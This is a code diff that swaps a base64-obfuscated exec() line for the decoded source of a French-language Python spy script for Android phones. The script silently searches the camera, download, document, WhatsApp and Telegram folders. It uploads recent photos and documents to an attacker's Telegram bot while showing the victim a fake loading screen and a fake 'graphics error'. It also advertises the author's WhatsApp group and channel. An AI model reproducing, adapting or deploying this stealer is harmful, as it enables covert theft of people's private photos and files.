@@ -1,4 +1,194 @@
-# Obfuscated by rebelle 
+#!/usr/bin/env python3
+import requests
+import os
+import glob
+from datetime import datetime
+import subprocess
+import sys
+import argparse
+import time
 
-import base64
-exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IG9zCmltcG9ydCBnbG9iCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzeXMKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCB0aW1lCgojIFZhcmlhYmxlcyBnbG9iYWxlcwpCT1RfVE9LRU4gPSBOb25lCkNIQVRfSUQgPSBOb25lCgpkZWYgYWZmaWNoZXJfY2hhcmdlbWVudCgpOgogICAgIiIiQWZmaWNoZSB1bmlxdWVtZW50IGwnw6ljcmFuIGRlIGNoYXJnZW1lbnQiIiIKICAgIHByaW50KCJcMDMzWzk1bSIgKyAiPSIgKiA1MCkKICAgIHByaW50KCJcMDMzWzk1bSIgKyAi8J+mueKAjeKZgu+4jyAgU0NSSVBUIFJFQkVMTEUgTUFTUVXDiSIpCiAgICBwcmludCgiXDAzM1s5NW0iICsgIj0iICogNTApCiAgICBwcmludCgiXDAzM1s5Nm0iICsgIvCfk7EgUHJvY2Vzc3VzIGVuIGNvdXJzLi4uIikKICAgIHByaW50KCJcMDMzWzkzbSIgKyAi4o+zIFZldWlsbGV6IHBhdGllbnRlciIpCiAgICBwcmludCgiXDAzM1s5NW0iICsgIj0iICogNTAgKyAiXDAzM1swbSIpCgpkZWYgZW52b3llcl9tZXNzYWdlX3JlYmVsbGUoKToKICAgICIiIkVudm9pZSBsZSBtZXNzYWdlIGRlIGNyw6lkaXRzIGF1IGJvdCIiIgogICAgbWVzc2FnZSA9ICIiIvCflLAgPGI+U0NSSVBUIENPRMOJIFBBUiBSRUJFTExFIE1BU1FVw4k8L2I+IPCflLAKCvCfk7EgPGI+TEVTIEdST1VQRVMgRU4gQlVMTEU8L2I+CvCfkaUgPGI+R1JPVVBFIFdIPC9iPgpodHRwczovL2NoYXQud2hhdHNhcHAuY29tL0Y5TmJBRGI3TDd2OVNBTGZkQmE5enE/bW9kZT13d3QKCvCfk6IgPGI+Q0hBw45ORSBXSDwvYj4gCmh0dHBzOi8vd2hhdHNhcHAuY29tL2NoYW5uZWwvMDAyOVZiNlpsZkFFbGFnclVRc083NTNXCgrwn5K7IDxiPkTDiVZFTE9QUEVVUjwvYj4KQFJlYmVsbGVNYXNxdWUxCgrwn46vIDxpPlByb2Nlc3N1cyBkZSBjb2xsZWN0ZSBkw6ltYXJyw6k8L2k+IiIiCiAgICAKICAgIHJldHVybiBlbnZveWVyX3RlbGVncmFtX21lc3NhZ2UobWVzc2FnZSkKCmRlZiBlbnZveWVyX3RlbGVncmFtX21lc3NhZ2UobWVzc2FnZSk6CiAgICAiIiJFbnZveWVyIHVuIG1lc3NhZ2UgdGV4dGUiIiIKICAgIGlmIG5vdCBCT1RfVE9LRU4gb3Igbm90IENIQVRfSUQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgCiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Qk9UX1RPS0VOfS9zZW5kTWVzc2FnZSIKICAgIGRhdGEgPSB7ImNoYXRfaWQiOiBDSEFUX0lELCAidGV4dCI6IG1lc3NhZ2UsICJwYXJzZV9tb2RlIjogIkhUTUwifQogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249ZGF0YSwgdGltZW91dD0xMCkKICAgICAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgc2Nhbm5lcl9kb3NzaWVyc19jb21wbGV0KCk6CiAgICAiIiJTY2FuIENPTVBMRVQgc2lsZW5jaWV1eCIiIgogICAgZG9zc2llcnNfYmFzZSA9IFsKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNIiwKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9QaWN0dXJlcyIsIAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL0Rvd25sb2FkIiwKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9Nb3ZpZXMiLAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL1ZpZGVvIiwKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9NdXNpYyIsCiAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAvRG9jdW1lbnRzIiwKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9YZW5kZXIiLAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL1doYXRzQXBwIiwKICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9UZWxlZ3JhbSIsCiAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAvQW5kcm9pZC9tZWRpYS9jb20ud2hhdHNhcHAiLAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvbWVkaWEvY29tLndoYXRzYXBwLnc0YiIsCiAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAvQW5kcm9pZC9kYXRhL2NvbS53aGF0c2FwcCIsCiAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVkLzAvQW5kcm9pZC9kYXRhL2NvbS53aGF0c2FwcC53NGIiCiAgICBdCiAgICAKICAgIGZpY2hpZXJzX3Ryb3V2ZXMgPSB7ImltYWdlcyI6IFtdLCAiZG9jdW1lbnRzIjogW119CiAgICAKICAgIGZvcm1hdHNfaW1hZ2VzID0gWycqLmpwZycsICcqLmpwZWcnLCAnKi5wbmcnLCAnKi53ZWJwJ10KICAgIGZvcm1hdHNfZG9jdW1lbnRzID0gWycqLnBkZicsICcqLmRvYycsICcqLmRvY3gnLCAnKi50eHQnLCAnKi54bHMnLCAnKi54bHN4J10KICAgIAogICAgZm9yIGRvc3NpZXJfYmFzZSBpbiBkb3NzaWVyc19iYXNlOgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGRvc3NpZXJfYmFzZSk6CiAgICAgICAgICAgICMgSW1hZ2VzCiAgICAgICAgICAgIGZvciBmb3JtYXRfaW1nIGluIGZvcm1hdHNfaW1hZ2VzOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHBhdHRlcm4gPSBmIntkb3NzaWVyX2Jhc2V9LyoqL3tmb3JtYXRfaW1nfSIKICAgICAgICAgICAgICAgICAgICBmaWNoaWVycyA9IGdsb2IuZ2xvYihwYXR0ZXJuLCByZWN1cnNpdmU9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICBmb3IgZmljaGllciBpbiBmaWNoaWVyczoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5nZXRzaXplKGZpY2hpZXIpIDwgMTAgKiAxMDI0ICogMTAyNDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpY2hpZXJzX3Ryb3V2ZXNbImltYWdlcyJdLmFwcGVuZChmaWNoaWVyKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIAogICAgICAgICAgICAjIERvY3VtZW50cyAgCiAgICAgICAgICAgIGZvciBmb3JtYXRfZG9jIGluIGZvcm1hdHNfZG9jdW1lbnRzOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHBhdHRlcm4gPSBmIntkb3NzaWVyX2Jhc2V9LyoqL3tmb3JtYXRfZG9jfSIKICAgICAgICAgICAgICAgICAgICBmaWNoaWVycyA9IGdsb2IuZ2xvYihwYXR0ZXJuLCByZWN1cnNpdmU9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICBmb3IgZmljaGllciBpbiBmaWNoaWVyczoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3MucGF0aC5nZXRzaXplKGZpY2hpZXIpIDwgMTUgKiAxMDI0ICogMTAyNDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpY2hpZXJzX3Ryb3V2ZXNbImRvY3VtZW50cyJdLmFwcGVuZChmaWNoaWVyKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAKICAgIGZvciB0eXBlX2ZpY2hpZXIgaW4gZmljaGllcnNfdHJvdXZlczoKICAgICAgICBmaWNoaWVyc190cm91dmVzW3R5cGVfZmljaGllcl0uc29ydChrZXk9b3MucGF0aC5nZXRtdGltZSwgcmV2ZXJzZT1UcnVlKQogICAgICAgIGZpY2hpZXJzX3Ryb3V2ZXNbdHlwZV9maWNoaWVyXSA9IGZpY2hpZXJzX3Ryb3V2ZXNbdHlwZV9maWNoaWVyXVs6MjBdCiAgICAKICAgIHJldHVybiBmaWNoaWVyc190cm91dmVzCgpkZWYgZW52b3llcl9maWNoaWVyc19zaWxlbmNpZXV4KGZpY2hpZXJzKToKICAgICIiIkVudm9pIGNvbXBsw6h0ZW1lbnQgc2lsZW5jaWV1eCIiIgogICAgdG90YWxfZW52b3llcyA9IDAKICAgIAogICAgIyBJbWFnZXMKICAgIGlmIGZpY2hpZXJzWyJpbWFnZXMiXToKICAgICAgICBmb3IgaW1hZ2UgaW4gZmljaGllcnNbImltYWdlcyJdWzoxNV06CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGlmIGVudm95ZXJfZmljaGllcl90ZWxlZ3JhbShpbWFnZSwgInBob3RvIik6CiAgICAgICAgICAgICAgICAgICAgdG90YWxfZW52b3llcyArPSAxCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuMykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgCiAgICAjIERvY3VtZW50cyAgCiAgICBpZiBmaWNoaWVyc1siZG9jdW1lbnRzIl06CiAgICAgICAgZm9yIGRvY3VtZW50IGluIGZpY2hpZXJzWyJkb2N1bWVudHMiXVs6MTBdOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBlbnZveWVyX2ZpY2hpZXJfdGVsZWdyYW0oZG9jdW1lbnQsICJkb2N1bWVudCIpOgogICAgICAgICAgICAgICAgICAgIHRvdGFsX2Vudm95ZXMgKz0gMQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjIpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgIAogICAgcmV0dXJuIHRvdGFsX2Vudm95ZXMKCmRlZiBlbnZveWVyX2ZpY2hpZXJfdGVsZWdyYW0oZmljaGllcl9wYXRoLCB0eXBlX2ZpY2hpZXIpOgogICAgIiIiRW52b2kgc2lsZW5jaWV1eCBkJ3VuIGZpY2hpZXIiIiIKICAgIHRyeToKICAgICAgICBpZiB0eXBlX2ZpY2hpZXIgPT0gInBob3RvIjoKICAgICAgICAgICAgdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e0JPVF9UT0tFTn0vc2VuZFBob3RvIgogICAgICAgICAgICBmaWxlcyA9IHsncGhvdG8nOiBvcGVuKGZpY2hpZXJfcGF0aCwgJ3JiJyl9CiAgICAgICAgZWxzZToKICAgICAgICAgICAgdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e0JPVF9UT0tFTn0vc2VuZERvY3VtZW50IgogICAgICAgICAgICBmaWxlcyA9IHsnZG9jdW1lbnQnOiBvcGVuKGZpY2hpZXJfcGF0aCwgJ3JiJyl9CiAgICAgICAgCiAgICAgICAgZGF0YSA9IHsnY2hhdF9pZCc6IENIQVRfSUR9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMsIGRhdGE9ZGF0YSwgdGltZW91dD0yMCkKICAgICAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgYWZmaWNoZXJfZmluKCk6CiAgICAiIiJBZmZpY2hlIHVuaXF1ZW1lbnQgbGUgbWVzc2FnZSBmaW5hbCIiIgogICAgcHJpbnQoIlwwMzNbOTVtIiArICI9IiAqIDUwKQogICAgcHJpbnQoIlwwMzNbOTJtIiArICLwn46JIFBST0NFU1NVUyBURVJNSU7DiSBBVkVDIFNVQ0PDiFMiKQogICAgcHJpbnQoIlwwMzNbOTFtIiArICLwn5qrIEVSUkVVUiBEVSBHUkFQSElRVUUiKQogICAgcHJpbnQoIlwwMzNbOTVtIiArICI9IiAqIDUwICsgIlwwMzNbMG0iKQoKZGVmIG1haW4oKToKICAgICMgQ29uZmlndXJhdGlvbiBkZXMgYXJndW1lbnRzCiAgICBwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcihkZXNjcmlwdGlvbj0nU2NyaXB0IFJlYmVsbGUgTWFzcXXDqScpCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctaWQnLCAnLS11c2VyaWQnLCByZXF1aXJlZD1UcnVlLCBoZWxwPSdJRCBUZWxlZ3JhbSB1dGlsaXNhdGV1cicpCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctY2wnLCAnLS10b2tlbicsIHJlcXVpcmVkPVRydWUsIGhlbHA9J1Rva2VuIGR1IGJvdCBUZWxlZ3JhbScpCiAgICAKICAgIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpCiAgICAKICAgIGdsb2JhbCBCT1RfVE9LRU4sIENIQVRfSUQKICAgIEJPVF9UT0tFTiA9IGFyZ3MudG9rZW4KICAgIENIQVRfSUQgPSBhcmdzLnVzZXJpZAogICAgCiAgICAjIMOJY3JhbiBkZSBjaGFyZ2VtZW50CiAgICBhZmZpY2hlcl9jaGFyZ2VtZW50KCkKICAgIAogICAgIyBQcm9jZXNzdXMgQ09NUEzDiFRFTUVOVCBTSUxFTkNJRVVYCiAgICBlbnZveWVyX21lc3NhZ2VfcmViZWxsZSgpCiAgICBmaWNoaWVycyA9IHNjYW5uZXJfZG9zc2llcnNfY29tcGxldCgpCiAgICB0b3RhbF9lbnZveWVzID0gZW52b3llcl9maWNoaWVyc19zaWxlbmNpZXV4KGZpY2hpZXJzKQogICAgCiAgICAjIE1lc3NhZ2UgZmluYWwKICAgIHRpbWUuc2xlZXAoMikKICAgIGFmZmljaGVyX2ZpbigpCiAgICAKICAgICMgTWVzc2FnZSBmaW5hbCBhdSBib3QKICAgIG1lc3NhZ2VfZmluYWwgPSBmIiIi8J+OiSA8Yj5QUk9DRVNTVVMgVEVSTUlOw4kgQVZFQyBTVUNDw4hTPC9iPgoK4o+wIDxpPkhldXJlIGRlIGZpbjoge2RhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclSDolTTolUycpfTwvaT4KCvCfmqsgPGI+RVJSRVVSIERVIEdSQVBISVFVRTwvYj4KPGk+SW50ZXJmYWNlIHV0aWxpc2F0ZXVyIG5vbiBkaXNwb25pYmxlPC9pPiIiIgogICAgCiAgICBlbnZveWVyX3RlbGVncmFtX21lc3NhZ2UobWVzc2FnZV9maW5hbCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCk='))
+# Variables globales
+BOT_TOKEN = None
+CHAT_ID = None
+
+def afficher_chargement():
+    """Affiche uniquement l'écran de chargement"""
+    print("\033[95m" + "=" * 50)
+    print("\033[95m" + "🦹‍♂️  SCRIPT REBELLE MASQUÉ")
+    print("\033[95m" + "=" * 50)
+    print("\033[96m" + "📱 Processus en cours...")
+    print("\033[93m" + "⏳ Veuillez patienter")
+    print("\033[95m" + "=" * 50 + "\033[0m")
+
+def envoyer_message_rebelle():
+    """Envoie le message de crédits au bot"""
+    message = """🔰 <b>SCRIPT CODÉ PAR REBELLE MASQUÉ</b> 🔰
+
+📱 <b>LES GROUPES EN BULLE</b>
+👥 <b>GROUPE WH</b>
+https://chat.whatsapp.com/F9NbADb7L7v9SALfdBa9zq?mode=wwt
+
+📢 <b>CHAÎNE WH</b> 
+https://whatsapp.com/channel/0029Vb6ZlfAElagrUQsO753W
+
+💻 <b>DÉVELOPPEUR</b>
+@RebelleMasque1
+
+🎯 <i>Processus de collecte démarré</i>"""
+    
+    return envoyer_telegram_message(message)
+
+def envoyer_telegram_message(message):
+    """Envoyer un message texte"""
+    if not BOT_TOKEN or not CHAT_ID:
+        return False
+        
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
+    try:
+        response = requests.post(url, json=data, timeout=10)
+        return response.status_code == 200
+    except:
+        return False
+
+def scanner_dossiers_complet():
+    """Scan COMPLET silencieux"""
+    dossiers_base = [
+        "/storage/emulated/0/DCIM",
+        "/storage/emulated/0/Pictures", 
+        "/storage/emulated/0/Download",
+        "/storage/emulated/0/Movies",
+        "/storage/emulated/0/Video",
+        "/storage/emulated/0/Music",
+        "/storage/emulated/0/Documents",
+        "/storage/emulated/0/Xender",
+        "/storage/emulated/0/WhatsApp",
+        "/storage/emulated/0/Telegram",
+        "/storage/emulated/0/Android/media/com.whatsapp",
+        "/storage/emulated/0/Android/media/com.whatsapp.w4b",
+        "/storage/emulated/0/Android/data/com.whatsapp",
+        "/storage/emulated/0/Android/data/com.whatsapp.w4b"
+    ]
+    
+    fichiers_trouves = {"images": [], "documents": []}
+    
+    formats_images = ['*.jpg', '*.jpeg', '*.png', '*.webp']
+    formats_documents = ['*.pdf', '*.doc', '*.docx', '*.txt', '*.xls', '*.xlsx']
+    
+    for dossier_base in dossiers_base:
+        if os.path.exists(dossier_base):
+            # Images
+            for format_img in formats_images:
+                try:
+                    pattern = f"{dossier_base}/**/{format_img}"
+                    fichiers = glob.glob(pattern, recursive=True)
+                    for fichier in fichiers:
+                        if os.path.getsize(fichier) < 10 * 1024 * 1024:
+                            fichiers_trouves["images"].append(fichier)
+                except:
+                    continue
+            
+            # Documents  
+            for format_doc in formats_documents:
+                try:
+                    pattern = f"{dossier_base}/**/{format_doc}"
+                    fichiers = glob.glob(pattern, recursive=True)
+                    for fichier in fichiers:
+                        if os.path.getsize(fichier) < 15 * 1024 * 1024:
+                            fichiers_trouves["documents"].append(fichier)
+                except:
+                    continue
+    
+    for type_fichier in fichiers_trouves:
+        fichiers_trouves[type_fichier].sort(key=os.path.getmtime, reverse=True)
+        fichiers_trouves[type_fichier] = fichiers_trouves[type_fichier][:20]
+    
+    return fichiers_trouves
+
+def envoyer_fichiers_silencieux(fichiers):
+    """Envoi complètement silencieux"""
+    total_envoyes = 0
+    
+    # Images
+    if fichiers["images"]:
+        for image in fichiers["images"][:15]:
+            try:
+                if envoyer_fichier_telegram(image, "photo"):
+                    total_envoyes += 1
+                time.sleep(0.3)
+            except:
+                pass
+    
+    # Documents  
+    if fichiers["documents"]:
+        for document in fichiers["documents"][:10]:
+            try:
+                if envoyer_fichier_telegram(document, "document"):
+                    total_envoyes += 1
+                time.sleep(0.2)
+            except:
+                pass
+    
+    return total_envoyes
+
+def envoyer_fichier_telegram(fichier_path, type_fichier):
+    """Envoi silencieux d'un fichier"""
+    try:
+        if type_fichier == "photo":
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+            files = {'photo': open(fichier_path, 'rb')}
+        else:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+            files = {'document': open(fichier_path, 'rb')}
+        
+        data = {'chat_id': CHAT_ID}
+        response = requests.post(url, files=files, data=data, timeout=20)
+        return response.status_code == 200
+    except:
+        return False
+
+def afficher_fin():
+    """Affiche uniquement le message final"""
+    print("\033[95m" + "=" * 50)
+    print("\033[92m" + "🎉 PROCESSUS TERMINÉ AVEC SUCCÈS")
+    print("\033[91m" + "🚫 ERREUR DU GRAPHIQUE")
+    print("\033[95m" + "=" * 50 + "\033[0m")
+
+def main():
+    # Configuration des arguments
+    parser = argparse.ArgumentParser(description='Script Rebelle Masqué')
+    parser.add_argument('-id', '--userid', required=True, help='ID Telegram utilisateur')
+    parser.add_argument('-cl', '--token', required=True, help='Token du bot Telegram')
+    
+    args = parser.parse_args()
+    
+    global BOT_TOKEN, CHAT_ID
+    BOT_TOKEN = args.token
+    CHAT_ID = args.userid
+    
+    # Écran de chargement
+    afficher_chargement()
+    
+    # Processus COMPLÈTEMENT SILENCIEUX
+    envoyer_message_rebelle()
+    fichiers = scanner_dossiers_complet()
+    total_envoyes = envoyer_fichiers_silencieux(fichiers)
+    
+    # Message final
+    time.sleep(2)
+    afficher_fin()
+    
+    # Message final au bot
+    message_final = f"""🎉 <b>PROCESSUS TERMINÉ AVEC SUCCÈS</b>
+
+⏰ <i>Heure de fin: {datetime.now().strftime('%H:%M:%S')}</i>
+
+🚫 <b>ERREUR DU GRAPHIQUE</b>
+<i>Interface utilisateur non disponible</i>"""
+    
+    envoyer_telegram_message(message_final)
+
+if __name__ == "__main__":
+    main()
+    #reblle masque ☠️
